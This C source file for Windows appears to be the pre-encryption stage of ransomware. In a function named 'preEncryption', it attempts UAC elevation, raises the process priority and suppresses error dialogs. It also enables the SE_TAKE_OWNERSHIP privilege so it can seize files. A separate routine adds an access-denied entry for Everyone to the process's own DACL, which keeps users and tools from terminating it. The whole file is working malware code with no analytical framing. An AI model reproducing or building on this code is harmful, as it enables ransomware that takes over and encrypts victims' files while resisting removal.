#include "pre.h"
#include "uac.h"
#include "debug.h"
#include <other/memory.h>

PreStatus_t denyProcessAccess()
{
	HANDLE hProcess = GetCurrentProcess();
	PACL dacl;
	
	if (GetSecurityInfo(hProcess, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &dacl, NULL, NULL) != ERROR_SUCCESS)
		return PSTATUS_DENY_PROCESS_ERROR;
	
	PSID worldSID;
	SID_IDENTIFIER_AUTHORITY identifierAuthority = { SECURITY_WORLD_SID_AUTHORITY };
	if (!AllocateAndInitializeSid(&identifierAuthority, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &worldSID))
		return PSTATUS_DENY_PROCESS_ERROR;
	
	// Calculate size of the new SID
	PreStatus_t status = PSTATUS_DENY_PROCESS_ERROR;
	ACL_SIZE_INFORMATION aclInfo;
	if (!GetAclInformation(dacl, &aclInfo, sizeof(aclInfo), AclSizeInformation))
		goto cleanup;
	
	DWORD sidSize = GetLengthSid(worldSID);
	if (!IsValidSid(worldSID))
		goto cleanup;
	
	// Create a new SID
	DWORD newAclSize = aclInfo.AclBytesInUse + 0x10 + 2 * sidSize;
	PACL newAcl = (PACL)smalloc(newAclSize, sizeof(BYTE));
	if (!InitializeAcl(newAcl, newAclSize, ACL_REVISION_DS))
		goto mcleanup;
	
	// Add ACCESS_DENIED access control entry to this ACL for EVERYONE group
	if (!AddAccessDeniedAce(newAcl, ACL_REVISION4, 1, worldSID))
		goto mcleanup;

	// Add each ACE
	DWORD aclCount = aclInfo.AceCount;
	for (; aclCount > 0; aclCount--)
	{
		LPVOID ace = NULL;
		if (!GetAce(dacl, aclInfo.AceCount - aclCount, &ace))
			break;
		
		DWORD aceSize = ((ACCESS_ALLOWED_ACE*)ace)->Header.AceSize;
		if (!AddAce(newAcl, ACL_REVISION_DS, MAXDWORD, ace, aceSize))
			break;
	}
	
	// Update the security info
	if (SetSecurityInfo(hProcess, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, newAcl, NULL) != ERROR_SUCCESS)
		goto mcleanup;
	
	status = PSTATUS_SUCCESS;
	
mcleanup:
	sfree(newAcl);
cleanup:
	FreeSid(worldSID);
	
	dbgstatus(status == PSTATUS_SUCCESS, "Denying access to the current process");
	return status;
}

PreStatus_t preEncryption()
{
#ifndef DEBUG
	if (!isAdmin() && getAdmin())
		return PSTATUS_GOT_ADMIN;
#endif
	
	// Set process as high priority
	if (!SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS))
		SetPriorityClass(GetCurrentProcess(), ABOVE_NORMAL_PRIORITY_CLASS);

	// Disable default errors
	UINT errMode = SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOALIGNMENTFAULTEXCEPT;
	SetErrorMode(errMode);
	dbgstatus(GetErrorMode() == errMode, "Disabling default errors");
	
	// Change token privileges to enable SE_TAKE_OWNERSHIP
	PreStatus_t status = PSTATUS_TOKEN_ERROR;
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
		goto end;
	
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!LookupPrivilegeValueW(NULL, SE_TAKE_OWNERSHIP_NAME, &luid))
	{
		CloseHandle(hToken);
		goto end;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		CloseHandle(hToken);
		goto end;
	}
	
	CloseHandle(hToken);
	status = PSTATUS_SUCCESS;
	
end:
	dbgstatus(status == PSTATUS_SUCCESS, "Changing token privilege to SE_TAKE_OWNERSHIP");
	return denyProcessAccess();
}